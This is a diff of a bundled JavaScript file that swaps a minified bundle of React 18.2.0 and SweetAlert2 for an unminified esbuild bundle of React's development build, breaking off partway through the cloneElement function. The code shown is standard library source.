@@ -1,4 +1,2022 @@
-(()=>{var h3=Object.create;var D2=Object.defineProperty;var r3=Object.getOwnPropertyDescriptor;var e3=Object.getOwnPropertyNames;var c3=Object.getPrototypeOf,n3=Object.prototype.hasOwnProperty;var v3=(e,v,l)=>v in e?D2(e,v,{enumerable:!0,configurable:!0,writable:!0,value:l}):e[v]=l;var I2=(e,v)=>()=>(v||e((v={exports:{}}).exports,v),v.exports);var l3=(e,v,l,n)=>{if(v&&typeof v=="object"||typeof v=="function")for(let o of e3(v))!n3.call(e,o)&&o!==l&&D2(e,o,{get:()=>v[o],enumerable:!(n=r3(v,o))||n.enumerable});return e};var e1=(e,v,l)=>(l=e!=null?h3(c3(e)):{},l3(v||!e||!e.__esModule?D2(l,"default",{value:e,enumerable:!0}):l,e));var L=(e,v,l)=>(v3(e,typeof v!="symbol"?v+"":v,l),l),N2=(e,v,l)=>{if(!v.has(e))throw TypeError("Cannot "+l)};var j=(e,v,l)=>(N2(e,v,"read from private field"),l?l.call(e):v.get(e)),K=(e,v,l)=>{if(v.has(e))throw TypeError("Cannot add the same private member more than once");v instanceof WeakSet?v.add(e):v.set(e,l)},J=(e,v,l,n)=>(N2(e,v,"write to private field"),n?n.call(e,l):v.set(e,l),l);var c1=(e,v,l)=>(N2(e,v,"access private method"),l);var Yt=I2(V=>{"use strict";var W1=Symbol.for("react.element"),i3=Symbol.for("react.portal"),o3=Symbol.for("react.fragment"),d3=Symbol.for("react.strict_mode"),g3=Symbol.for("react.profiler"),z3=Symbol.for("react.provider"),M3=Symbol.for("react.context"),p3=Symbol.for("react.forward_ref"),s3=Symbol.for("react.suspense"),u3=Symbol.for("react.memo"),H3=Symbol.for("react.lazy"),Nt=Symbol.iterator;function f3(e){return e===null||typeof e!="object"?null:(e=Nt&&e[Nt]||e["@@iterator"],typeof e=="function"?e:null)}var $t={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},jt=Object.assign,Gt={};function B1(e,v,l){this.props=e,this.context=v,this.refs=Gt,this.updater=l||$t}B1.prototype.isReactComponent={};B1.prototype.setState=function(e,v){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,v,"setState")};B1.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function Kt(){}Kt.prototype=B1.prototype;function U2(e,v,l){this.props=e,this.context=v,this.refs=Gt,this.updater=l||$t}var $2=U2.prototype=new Kt;$2.constructor=U2;jt($2,B1.prototype);$2.isPureReactComponent=!0;var Wt=Array.isArray,_t=Object.prototype.hasOwnProperty,j2={current:null},qt={key:!0,ref:!0,__self:!0,__source:!0};function Qt(e,v,l){var n,o={},p=null,u=null;if(v!=null)for(n in v.ref!==void 0&&(u=v.ref),v.key!==void 0&&(p=""+v.key),v)_t.call(v,n)&&!qt.hasOwnProperty(n)&&(o[n]=v[n]);var z=arguments.length-2;if(z===1)o.children=l;else if(1<z){for(var d=Array(z),M=0;M<z;M++)d[M]=arguments[M+2];o.children=d}if(e&&e.defaultProps)for(n in z=e.defaultProps,z)o[n]===void 0&&(o[n]=z[n]);return{$$typeof:W1,type:e,key:p,ref:u,props:o,_owner:j2.current}}function V3(e,v){return{$$typeof:W1,type:e.type,key:v,ref:e.ref,props:e.props,_owner:e._owner}}function G2(e){return typeof e=="object"&&e!==null&&e.$$typeof===W1}function m3(e){var v={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(l){return v[l]})}var Ut=/\/+/g;function W2(e,v){return typeof e=="object"&&e!==null&&e.key!=null?m3(""+e.key):v.toString(36)}function l2(e,v,l,n,o){var p=typeof e;(p==="undefined"||p==="boolean")&&(e=null);var u=!1;if(e===null)u=!0;else switch(p){case"string":case"number":u=!0;break;case"object":switch(e.$$typeof){case W1:case i3:u=!0}}if(u)return u=e,o=o(u),e=n===""?"."+W2(u,0):n,Wt(o)?(l="",e!=null&&(l=e.replace(Ut,"$&/")+"/"),l2(o,v,l,"",function(M){return M})):o!=null&&(G2(o)&&(o=V3(o,l+(!o.key||u&&u.key===o.key?"":(""+o.key).replace(Ut,"$&/")+"/")+e)),v.push(o)),1;if(u=0,n=n===""?".":n+":",Wt(e))for(var z=0;z<e.length;z++){p=e[z];var d=n+W2(p,z);u+=l2(p,v,l,d,o)}else if(d=f3(e),typeof d=="function")for(e=d.call(e),z=0;!(p=e.next()).done;)p=p.value,d=n+W2(p,z++),u+=l2(p,v,l,d,o);else if(p==="object")throw v=String(e),Error("Objects are not valid as a React child (found: "+(v==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":v)+"). If you meant to render a collection of children, use an array instead.");return u}function v2(e,v,l){if(e==null)return e;var n=[],o=0;return l2(e,n,"","",function(p){return v.call(l,p,o++)}),n}function x3(e){if(e._status===-1){var v=e._result;v=v(),v.then(function(l){(e._status===0||e._status===-1)&&(e._status=1,e._result=l)},function(l){(e._status===0||e._status===-1)&&(e._status=2,e._result=l)}),e._status===-1&&(e._status=0,e._result=v)}if(e._status===1)return e._result.default;throw e._result}var E={current:null},i2={transition:null},w3={ReactCurrentDispatcher:E,ReactCurrentBatchConfig:i2,ReactCurrentOwner:j2};V.Children={map:v2,forEach:function(e,v,l){v2(e,function(){v.apply(this,arguments)},l)},count:function(e){var v=0;return v2(e,function(){v++}),v},toArray:function(e){return v2(e,function(v){return v})||[]},only:function(e){if(!G2(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};V.Component=B1;V.Fragment=o3;V.Profiler=g3;V.PureComponent=U2;V.StrictMode=d3;V.Suspense=s3;V.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=w3;V.cloneElement=function(e,v,l){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var n=jt({},e.props),o=e.key,p=e.ref,u=e._owner;if(v!=null){if(v.ref!==void 0&&(p=v.ref,u=j2.current),v.key!==void 0&&(o=""+v.key),e.type&&e.type.defaultProps)var z=e.type.defaultProps;for(d in v)_t.call(v,d)&&!qt.hasOwnProperty(d)&&(n[d]=v[d]===void 0&&z!==void 0?z[d]:v[d])}var d=arguments.length-2;if(d===1)n.children=l;else if(1<d){z=Array(d);for(var M=0;M<d;M++)z[M]=arguments[M+2];n.children=z}return{$$typeof:W1,type:e.type,key:o,ref:p,props:n,_owner:u}};V.createContext=function(e){return e={$$typeof:M3,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:z3,_context:e},e.Consumer=e};V.createElement=Qt;V.createFactory=function(e){var v=Qt.bind(null,e);return v.type=e,v};V.createRef=function(){return{current:null}};V.forwardRef=function(e){return{$$typeof:p3,render:e}};V.isValidElement=G2;V.lazy=function(e){return{$$typeof:H3,_payload:{_status:-1,_result:e},_init:x3}};V.memo=function(e,v){return{$$typeof:u3,type:e,compare:v===void 0?null:v}};V.startTransition=function(e){var v=i2.transition;i2.transition={};try{e()}finally{i2.transition=v}};V.unstable_act=function(){throw Error("act(...) is not supported in production builds of React.")};V.useCallback=function(e,v){return E.current.useCallback(e,v)};V.useContext=function(e){return E.current.useContext(e)};V.useDebugValue=function(){};V.useDeferredValue=function(e){return E.current.useDeferredValue(e)};V.useEffect=function(e,v){return E.current.useEffect(e,v)};V.useId=function(){return E.current.useId()};V.useImperativeHandle=function(e,v,l){return E.current.useImperativeHandle(e,v,l)};V.useInsertionEffect=function(e,v){return E.current.useInsertionEffect(e,v)};V.useLayoutEffect=function(e,v){return E.current.useLayoutEffect(e,v)};V.useMemo=function(e,v){return E.current.useMemo(e,v)};V.useReducer=function(e,v,l){return E.current.useReducer(e,v,l)};V.useRef=function(e){return E.current.useRef(e)};V.useState=function(e){return E.current.useState(e)};V.useSyncExternalStore=function(e,v,l){return E.current.useSyncExternalStore(e,v,l)};V.useTransition=function(){return E.current.useTransition()};V.version="18.2.0"});var o2=I2((P3,Zt)=>{"use strict";Zt.exports=Yt()});var A1=I2((Y,Q2)=>{(function(e,v){typeof Y=="object"&&typeof Q2<"u"?Q2.exports=v():typeof define=="function"&&define.amd?define(v):(e=typeof globalThis<"u"?globalThis:e||self,e.Sweetalert2=v())})(Y,function(){"use strict";var e={awaitingPromise:new WeakMap,promise:new WeakMap,innerParams:new WeakMap,domCache:new WeakMap};let v="swal2-",l=t=>{let a={};for(let r in t)a[t[r]]=v+t[r];return a},n=l(["container","shown","height-auto","iosfix","popup","modal","no-backdrop","no-transition","toast","toast-shown","show","hide","close","title","html-container","actions","confirm","deny","cancel","default-outline","footer","icon","icon-content","image","input","file","range","select","radio","checkbox","label","textarea","inputerror","input-label","validation-message","progress-steps","active-progress-step","progress-step","progress-step-line","loader","loading","styled","top","top-start","top-end","top-left","top-right","center","center-start","center-end","center-left","center-right","bottom","bottom-start","bottom-end","bottom-left","bottom-right","grow-row","grow-column","grow-fullscreen","rtl","timer-progress-bar","timer-progress-bar-container","scrollbar-measure","icon-success","icon-warning","icon-info","icon-question","icon-error"]),o=l(["success","warning","info","question","error"]),p="SweetAlert2:",u=t=>{let a=[];for(let r=0;r<t.length;r++)a.indexOf(t[r])===-1&&a.push(t[r]);return a},z=t=>t.charAt(0).toUpperCase()+t.slice(1),d=t=>{console.warn(`${p} ${typeof t=="object"?t.join(" "):t}`)},M=t=>{console.error(`${p} ${t}`)},I=[],C=t=>{I.includes(t)||(I.push(t),d(t))},R=(t,a)=>{C(`"${t}" is deprecated and will be removed in the next major release. Please use "${a}" instead.`)},G=t=>typeof t=="function"?t():t,v1=t=>t&&typeof t.toPromise=="function",O=t=>v1(t)?t.toPromise():Promise.resolve(t),t1=t=>t&&Promise.resolve(t)===t,A=()=>document.body.querySelector(`.${n.container}`),a1=t=>{let a=A();return a?a.querySelector(t):null},y=t=>a1(`.${t}`),m=()=>y(n.popup),l1=()=>y(n.icon),m2=()=>y(n["icon-content"]),J1=()=>y(n.title),h1=()=>y(n["html-container"]),X1=()=>y(n.image),s=()=>y(n["progress-steps"]),w=()=>y(n["validation-message"]),B=()=>a1(`.${n.actions} .${n.confirm}`),P=()=>a1(`.${n.actions} .${n.deny}`),u0=()=>y(n["input-label"]),u1=()=>a1(`.${n.loader}`),i1=()=>a1(`.${n.actions} .${n.cancel}`),E1=()=>y(n.actions),rt=()=>y(n.footer),t2=()=>y(n["timer-progress-bar"]),x2=()=>y(n.close),H0=`
+(() => {
+  var __create = Object.create;
+  var __defProp = Object.defineProperty;
+  var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
+  var __getOwnPropNames = Object.getOwnPropertyNames;
+  var __getProtoOf = Object.getPrototypeOf;
+  var __hasOwnProp = Object.prototype.hasOwnProperty;
+  var __defNormalProp = (obj, key, value) => key in obj ? __defProp(obj, key, { enumerable: true, configurable: true, writable: true, value }) : obj[key] = value;
+  var __commonJS = (cb, mod) => function __require() {
+    return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
+  };
+  var __copyProps = (to, from, except, desc) => {
+    if (from && typeof from === "object" || typeof from === "function") {
+      for (let key of __getOwnPropNames(from))
+        if (!__hasOwnProp.call(to, key) && key !== except)
+          __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
+    }
+    return to;
+  };
+  var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
+    // If the importer is in node compatibility mode or this is not an ESM
+    // file that has been converted to a CommonJS file using a Babel-
+    // compatible transform (i.e. "__esModule" has not been set), then set
+    // "default" to the CommonJS "module.exports" for node compatibility.
+    isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
+    mod
+  ));
+  var __publicField = (obj, key, value) => {
+    __defNormalProp(obj, typeof key !== "symbol" ? key + "" : key, value);
+    return value;
+  };
+  var __accessCheck = (obj, member, msg) => {
+    if (!member.has(obj))
+      throw TypeError("Cannot " + msg);
+  };
+  var __privateGet = (obj, member, getter) => {
+    __accessCheck(obj, member, "read from private field");
+    return getter ? getter.call(obj) : member.get(obj);
+  };
+  var __privateAdd = (obj, member, value) => {
+    if (member.has(obj))
+      throw TypeError("Cannot add the same private member more than once");
+    member instanceof WeakSet ? member.add(obj) : member.set(obj, value);
+  };
+  var __privateSet = (obj, member, value, setter) => {
+    __accessCheck(obj, member, "write to private field");
+    setter ? setter.call(obj, value) : member.set(obj, value);
+    return value;
+  };
+  var __privateMethod = (obj, member, method) => {
+    __accessCheck(obj, member, "access private method");
+    return method;
+  };
+
+  // node_modules/react/cjs/react.development.js
+  var require_react_development = __commonJS({
+    "node_modules/react/cjs/react.development.js"(exports, module) {
+      "use strict";
+      if (true) {
+        (function() {
+          "use strict";
+          if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ !== "undefined" && typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.registerInternalModuleStart === "function") {
+            __REACT_DEVTOOLS_GLOBAL_HOOK__.registerInternalModuleStart(new Error());
+          }
+          var ReactVersion = "18.2.0";
+          var REACT_ELEMENT_TYPE = Symbol.for("react.element");
+          var REACT_PORTAL_TYPE = Symbol.for("react.portal");
+          var REACT_FRAGMENT_TYPE = Symbol.for("react.fragment");
+          var REACT_STRICT_MODE_TYPE = Symbol.for("react.strict_mode");
+          var REACT_PROFILER_TYPE = Symbol.for("react.profiler");
+          var REACT_PROVIDER_TYPE = Symbol.for("react.provider");
+          var REACT_CONTEXT_TYPE = Symbol.for("react.context");
+          var REACT_FORWARD_REF_TYPE = Symbol.for("react.forward_ref");
+          var REACT_SUSPENSE_TYPE = Symbol.for("react.suspense");
+          var REACT_SUSPENSE_LIST_TYPE = Symbol.for("react.suspense_list");
+          var REACT_MEMO_TYPE = Symbol.for("react.memo");
+          var REACT_LAZY_TYPE = Symbol.for("react.lazy");
+          var REACT_OFFSCREEN_TYPE = Symbol.for("react.offscreen");
+          var MAYBE_ITERATOR_SYMBOL = Symbol.iterator;
+          var FAUX_ITERATOR_SYMBOL = "@@iterator";
+          function getIteratorFn(maybeIterable) {
+            if (maybeIterable === null || typeof maybeIterable !== "object") {
+              return null;
+            }
+            var maybeIterator = MAYBE_ITERATOR_SYMBOL && maybeIterable[MAYBE_ITERATOR_SYMBOL] || maybeIterable[FAUX_ITERATOR_SYMBOL];
+            if (typeof maybeIterator === "function") {
+              return maybeIterator;
+            }
+            return null;
+          }
+          var ReactCurrentDispatcher = {
+            /**
+             * @internal
+             * @type {ReactComponent}
+             */
+            current: null
+          };
+          var ReactCurrentBatchConfig = {
+            transition: null
+          };
+          var ReactCurrentActQueue = {
+            current: null,
+            // Used to reproduce behavior of `batchedUpdates` in legacy mode.
+            isBatchingLegacy: false,
+            didScheduleLegacyUpdate: false
+          };
+          var ReactCurrentOwner = {
+            /**
+             * @internal
+             * @type {ReactComponent}
+             */
+            current: null
+          };
+          var ReactDebugCurrentFrame = {};
+          var currentExtraStackFrame = null;
+          function setExtraStackFrame(stack) {
+            {
+              currentExtraStackFrame = stack;
+            }
+          }
+          {
+            ReactDebugCurrentFrame.setExtraStackFrame = function(stack) {
+              {
+                currentExtraStackFrame = stack;
+              }
+            };
+            ReactDebugCurrentFrame.getCurrentStack = null;
+            ReactDebugCurrentFrame.getStackAddendum = function() {
+              var stack = "";
+              if (currentExtraStackFrame) {
+                stack += currentExtraStackFrame;
+              }
+              var impl = ReactDebugCurrentFrame.getCurrentStack;
+              if (impl) {
+                stack += impl() || "";
+              }
+              return stack;
+            };
+          }
+          var enableScopeAPI = false;
+          var enableCacheElement = false;
+          var enableTransitionTracing = false;
+          var enableLegacyHidden = false;
+          var enableDebugTracing = false;
+          var ReactSharedInternals = {
+            ReactCurrentDispatcher,
+            ReactCurrentBatchConfig,
+            ReactCurrentOwner
+          };
+          {
+            ReactSharedInternals.ReactDebugCurrentFrame = ReactDebugCurrentFrame;
+            ReactSharedInternals.ReactCurrentActQueue = ReactCurrentActQueue;
+          }
+          function warn(format) {
+            {
+              {
+                for (var _len = arguments.length, args = new Array(_len > 1 ? _len - 1 : 0), _key = 1; _key < _len; _key++) {
+                  args[_key - 1] = arguments[_key];
+                }
+                printWarning("warn", format, args);
+              }
+            }
+          }
+          function error(format) {
+            {
+              {
+                for (var _len2 = arguments.length, args = new Array(_len2 > 1 ? _len2 - 1 : 0), _key2 = 1; _key2 < _len2; _key2++) {
+                  args[_key2 - 1] = arguments[_key2];
+                }
+                printWarning("error", format, args);
+              }
+            }
+          }
+          function printWarning(level, format, args) {
+            {
+              var ReactDebugCurrentFrame2 = ReactSharedInternals.ReactDebugCurrentFrame;
+              var stack = ReactDebugCurrentFrame2.getStackAddendum();
+              if (stack !== "") {
+                format += "%s";
+                args = args.concat([stack]);
+              }
+              var argsWithFormat = args.map(function(item) {
+                return String(item);
+              });
+              argsWithFormat.unshift("Warning: " + format);
+              Function.prototype.apply.call(console[level], console, argsWithFormat);
+            }
+          }
+          var didWarnStateUpdateForUnmountedComponent = {};
+          function warnNoop(publicInstance, callerName) {
+            {
+              var _constructor = publicInstance.constructor;
+              var componentName = _constructor && (_constructor.displayName || _constructor.name) || "ReactClass";
+              var warningKey = componentName + "." + callerName;
+              if (didWarnStateUpdateForUnmountedComponent[warningKey]) {
+                return;
+              }
+              error("Can't call %s on a component that is not yet mounted. This is a no-op, but it might indicate a bug in your application. Instead, assign to `this.state` directly or define a `state = {};` class property with the desired state in the %s component.", callerName, componentName);
+              didWarnStateUpdateForUnmountedComponent[warningKey] = true;
+            }
+          }
+          var ReactNoopUpdateQueue = {
+            /**
+             * Checks whether or not this composite component is mounted.
+             * @param {ReactClass} publicInstance The instance we want to test.
+             * @return {boolean} True if mounted, false otherwise.
+             * @protected
+             * @final
+             */
+            isMounted: function(publicInstance) {
+              return false;
+            },
+            /**
+             * Forces an update. This should only be invoked when it is known with
+             * certainty that we are **not** in a DOM transaction.
+             *
+             * You may want to call this when you know that some deeper aspect of the
+             * component's state has changed but `setState` was not called.
+             *
+             * This will not invoke `shouldComponentUpdate`, but it will invoke
+             * `componentWillUpdate` and `componentDidUpdate`.
+             *
+             * @param {ReactClass} publicInstance The instance that should rerender.
+             * @param {?function} callback Called after component is updated.
+             * @param {?string} callerName name of the calling function in the public API.
+             * @internal
+             */
+            enqueueForceUpdate: function(publicInstance, callback, callerName) {
+              warnNoop(publicInstance, "forceUpdate");
+            },
+            /**
+             * Replaces all of the state. Always use this or `setState` to mutate state.
+             * You should treat `this.state` as immutable.
+             *
+             * There is no guarantee that `this.state` will be immediately updated, so
+             * accessing `this.state` after calling this method may return the old value.
+             *
+             * @param {ReactClass} publicInstance The instance that should rerender.
+             * @param {object} completeState Next state.
+             * @param {?function} callback Called after component is updated.
+             * @param {?string} callerName name of the calling function in the public API.
+             * @internal
+             */
+            enqueueReplaceState: function(publicInstance, completeState, callback, callerName) {
+              warnNoop(publicInstance, "replaceState");
+            },
+            /**
+             * Sets a subset of the state. This only exists because _pendingState is
+             * internal. This provides a merging strategy that is not available to deep
+             * properties which is confusing. TODO: Expose pendingState or don't use it
+             * during the merge.
+             *
+             * @param {ReactClass} publicInstance The instance that should rerender.
+             * @param {object} partialState Next partial state to be merged with state.
+             * @param {?function} callback Called after component is updated.
+             * @param {?string} Name of the calling function in the public API.
+             * @internal
+             */
+            enqueueSetState: function(publicInstance, partialState, callback, callerName) {
+              warnNoop(publicInstance, "setState");
+            }
+          };
+          var assign = Object.assign;
+          var emptyObject = {};
+          {
+            Object.freeze(emptyObject);
+          }
+          function Component(props, context, updater) {
+            this.props = props;
+            this.context = context;
+            this.refs = emptyObject;
+            this.updater = updater || ReactNoopUpdateQueue;
+          }
+          Component.prototype.isReactComponent = {};
+          Component.prototype.setState = function(partialState, callback) {
+            if (typeof partialState !== "object" && typeof partialState !== "function" && partialState != null) {
+              throw new Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
+            }
+            this.updater.enqueueSetState(this, partialState, callback, "setState");
+          };
+          Component.prototype.forceUpdate = function(callback) {
+            this.updater.enqueueForceUpdate(this, callback, "forceUpdate");
+          };
+          {
+            var deprecatedAPIs = {
+              isMounted: ["isMounted", "Instead, make sure to clean up subscriptions and pending requests in componentWillUnmount to prevent memory leaks."],
+              replaceState: ["replaceState", "Refactor your code to use setState instead (see https://github.com/facebook/react/issues/3236)."]
+            };
+            var defineDeprecationWarning = function(methodName, info) {
+              Object.defineProperty(Component.prototype, methodName, {
+                get: function() {
+                  warn("%s(...) is deprecated in plain JavaScript React classes. %s", info[0], info[1]);
+                  return void 0;
+                }
+              });
+            };
+            for (var fnName in deprecatedAPIs) {
+              if (deprecatedAPIs.hasOwnProperty(fnName)) {
+                defineDeprecationWarning(fnName, deprecatedAPIs[fnName]);
+              }
+            }
+          }
+          function ComponentDummy() {
+          }
+          ComponentDummy.prototype = Component.prototype;
+          function PureComponent(props, context, updater) {
+            this.props = props;
+            this.context = context;
+            this.refs = emptyObject;
+            this.updater = updater || ReactNoopUpdateQueue;
+          }
+          var pureComponentPrototype = PureComponent.prototype = new ComponentDummy();
+          pureComponentPrototype.constructor = PureComponent;
+          assign(pureComponentPrototype, Component.prototype);
+          pureComponentPrototype.isPureReactComponent = true;
+          function createRef() {
+            var refObject = {
+              current: null
+            };
+            {
+              Object.seal(refObject);
+            }
+            return refObject;
+          }
+          var isArrayImpl = Array.isArray;
+          function isArray(a) {
+            return isArrayImpl(a);
+          }
+          function typeName(value) {
+            {
+              var hasToStringTag = typeof Symbol === "function" && Symbol.toStringTag;
+              var type = hasToStringTag && value[Symbol.toStringTag] || value.constructor.name || "Object";
+              return type;
+            }
+          }
+          function willCoercionThrow(value) {
+            {
+              try {
+                testStringCoercion(value);
+                return false;
+              } catch (e) {
+                return true;
+              }
+            }
+          }
+          function testStringCoercion(value) {
+            return "" + value;
+          }
+          function checkKeyStringCoercion(value) {
+            {
+              if (willCoercionThrow(value)) {
+                error("The provided key is an unsupported type %s. This value must be coerced to a string before before using it here.", typeName(value));
+                return testStringCoercion(value);
+              }
+            }
+          }
+          function getWrappedName(outerType, innerType, wrapperName) {
+            var displayName = outerType.displayName;
+            if (displayName) {
+              return displayName;
+            }
+            var functionName = innerType.displayName || innerType.name || "";
+            return functionName !== "" ? wrapperName + "(" + functionName + ")" : wrapperName;
+          }
+          function getContextName(type) {
+            return type.displayName || "Context";
+          }
+          function getComponentNameFromType(type) {
+            if (type == null) {
+              return null;
+            }
+            {
+              if (typeof type.tag === "number") {
+                error("Received an unexpected object in getComponentNameFromType(). This is likely a bug in React. Please file an issue.");
+              }
+            }
+            if (typeof type === "function") {
+              return type.displayName || type.name || null;
+            }
+            if (typeof type === "string") {
+              return type;
+            }
+            switch (type) {
+              case REACT_FRAGMENT_TYPE:
+                return "Fragment";
+              case REACT_PORTAL_TYPE:
+                return "Portal";
+              case REACT_PROFILER_TYPE:
+                return "Profiler";
+              case REACT_STRICT_MODE_TYPE:
+                return "StrictMode";
+              case REACT_SUSPENSE_TYPE:
+                return "Suspense";
+              case REACT_SUSPENSE_LIST_TYPE:
+                return "SuspenseList";
+            }
+            if (typeof type === "object") {
+              switch (type.$$typeof) {
+                case REACT_CONTEXT_TYPE:
+                  var context = type;
+                  return getContextName(context) + ".Consumer";
+                case REACT_PROVIDER_TYPE:
+                  var provider = type;
+                  return getContextName(provider._context) + ".Provider";
+                case REACT_FORWARD_REF_TYPE:
+                  return getWrappedName(type, type.render, "ForwardRef");
+                case REACT_MEMO_TYPE:
+                  var outerName = type.displayName || null;
+                  if (outerName !== null) {
+                    return outerName;
+                  }
+                  return getComponentNameFromType(type.type) || "Memo";
+                case REACT_LAZY_TYPE: {
+                  var lazyComponent = type;
+                  var payload = lazyComponent._payload;
+                  var init = lazyComponent._init;
+                  try {
+                    return getComponentNameFromType(init(payload));
+                  } catch (x) {
+                    return null;
+                  }
+                }
+              }
+            }
+            return null;
+          }
+          var hasOwnProperty = Object.prototype.hasOwnProperty;
+          var RESERVED_PROPS = {
+            key: true,
+            ref: true,
+            __self: true,
+            __source: true
+          };
+          var specialPropKeyWarningShown, specialPropRefWarningShown, didWarnAboutStringRefs;
+          {
+            didWarnAboutStringRefs = {};
+          }
+          function hasValidRef(config) {
+            {
+              if (hasOwnProperty.call(config, "ref")) {
+                var getter = Object.getOwnPropertyDescriptor(config, "ref").get;
+                if (getter && getter.isReactWarning) {
+                  return false;
+                }
+              }
+            }
+            return config.ref !== void 0;
+          }
+          function hasValidKey(config) {
+            {
+              if (hasOwnProperty.call(config, "key")) {
+                var getter = Object.getOwnPropertyDescriptor(config, "key").get;
+                if (getter && getter.isReactWarning) {
+                  return false;
+                }
+              }
+            }
+            return config.key !== void 0;
+          }
+          function defineKeyPropWarningGetter(props, displayName) {
+            var warnAboutAccessingKey = function() {
+              {
+                if (!specialPropKeyWarningShown) {
+                  specialPropKeyWarningShown = true;
+                  error("%s: `key` is not a prop. Trying to access it will result in `undefined` being returned. If you need to access the same value within the child component, you should pass it as a different prop. (https://reactjs.org/link/special-props)", displayName);
+                }
+              }
+            };
+            warnAboutAccessingKey.isReactWarning = true;
+            Object.defineProperty(props, "key", {
+              get: warnAboutAccessingKey,
+              configurable: true
+            });
+          }
+          function defineRefPropWarningGetter(props, displayName) {
+            var warnAboutAccessingRef = function() {
+              {
+                if (!specialPropRefWarningShown) {
+                  specialPropRefWarningShown = true;
+                  error("%s: `ref` is not a prop. Trying to access it will result in `undefined` being returned. If you need to access the same value within the child component, you should pass it as a different prop. (https://reactjs.org/link/special-props)", displayName);
+                }
+              }
+            };
+            warnAboutAccessingRef.isReactWarning = true;
+            Object.defineProperty(props, "ref", {
+              get: warnAboutAccessingRef,
+              configurable: true
+            });
+          }
+          function warnIfStringRefCannotBeAutoConverted(config) {
+            {
+              if (typeof config.ref === "string" && ReactCurrentOwner.current && config.__self && ReactCurrentOwner.current.stateNode !== config.__self) {
+                var componentName = getComponentNameFromType(ReactCurrentOwner.current.type);
+                if (!didWarnAboutStringRefs[componentName]) {
+                  error('Component "%s" contains the string ref "%s". Support for string refs will be removed in a future major release. This case cannot be automatically converted to an arrow function. We ask you to manually fix this case by using useRef() or createRef() instead. Learn more about using refs safely here: https://reactjs.org/link/strict-mode-string-ref', componentName, config.ref);
+                  didWarnAboutStringRefs[componentName] = true;
+                }
+              }
+            }
+          }
+          var ReactElement2 = function(type, key, ref, self2, source, owner, props) {
+            var element = {
+              // This tag allows us to uniquely identify this as a React Element
+              $$typeof: REACT_ELEMENT_TYPE,
+              // Built-in properties that belong on the element
+              type,
+              key,
+              ref,
+              props,
+              // Record the component responsible for creating this element.
+              _owner: owner
+            };
+            {
+              element._store = {};
+              Object.defineProperty(element._store, "validated", {
+                configurable: false,
+                enumerable: false,
+                writable: true,
+                value: false
+              });
+              Object.defineProperty(element, "_self", {
+                configurable: false,
+                enumerable: false,
+                writable: false,
+                value: self2
+              });
+              Object.defineProperty(element, "_source", {
+                configurable: false,
+                enumerable: false,
+                writable: false,
+                value: source
+              });
+              if (Object.freeze) {
+                Object.freeze(element.props);
+                Object.freeze(element);
+              }
+            }
+            return element;
+          };
+          function createElement2(type, config, children) {
+            var propName;
+            var props = {};
+            var key = null;
+            var ref = null;
+            var self2 = null;
+            var source = null;
+            if (config != null) {
+              if (hasValidRef(config)) {
+                ref = config.ref;
+                {
+                  warnIfStringRefCannotBeAutoConverted(config);
+                }
+              }
+              if (hasValidKey(config)) {
+                {
+                  checkKeyStringCoercion(config.key);
+                }
+                key = "" + config.key;
+              }
+              self2 = config.__self === void 0 ? null : config.__self;
+              source = config.__source === void 0 ? null : config.__source;
+              for (propName in config) {
+                if (hasOwnProperty.call(config, propName) && !RESERVED_PROPS.hasOwnProperty(propName)) {
+                  props[propName] = config[propName];
+                }
+              }
+            }
+            var childrenLength = arguments.length - 2;
+            if (childrenLength === 1) {
+              props.children = children;
+            } else if (childrenLength > 1) {
+              var childArray = Array(childrenLength);
+              for (var i = 0; i < childrenLength; i++) {
+                childArray[i] = arguments[i + 2];
+              }
+              {
+                if (Object.freeze) {
+                  Object.freeze(childArray);
+                }
+              }
+              props.children = childArray;
+            }
+            if (type && type.defaultProps) {
+              var defaultProps = type.defaultProps;
+              for (propName in defaultProps) {
+                if (props[propName] === void 0) {
+                  props[propName] = defaultProps[propName];
+                }
+              }
+            }
+            {
+              if (key || ref) {
+                var displayName = typeof type === "function" ? type.displayName || type.name || "Unknown" : type;
+                if (key) {
+                  defineKeyPropWarningGetter(props, displayName);
+                }
+                if (ref) {
+                  defineRefPropWarningGetter(props, displayName);
+                }
+              }
+            }
+            return ReactElement2(type, key, ref, self2, source, ReactCurrentOwner.current, props);
+          }
+          function cloneAndReplaceKey(oldElement, newKey) {
+            var newElement = ReactElement2(oldElement.type, newKey, oldElement.ref, oldElement._self, oldElement._source, oldElement._owner, oldElement.props);
+            return newElement;
+          }
+          function cloneElement(element, config, children) {
+            if (element === null || element === void 0) {
+              throw new Error("React.cloneElement(...): The argument must be a React element, but you passed " + element + ".");
+            }
+            var propName;
+            var props = assign({}, element.props);
+            var key = element.key;
+            var ref = element.ref;
+            var self2 = element._self;
+            var source = element._source;
+            var owner = element._owner;
+            if (config != null) {
+              if (hasValidRef(config)) {
+                ref = config.ref;
+                owner = ReactCurrentOwner.current;
+              }
+              if (hasValidKey(config)) {
+                {
+                  checkKeyStringCoercion(config.key);
+                }
+                key = "" + config.key;
+              }
+              var defaultProps;
+              if (element.type && element.type.defaultProps) {
+                defaultProps = element.type.defaultProps;
+              }
+              for (propName in config) {
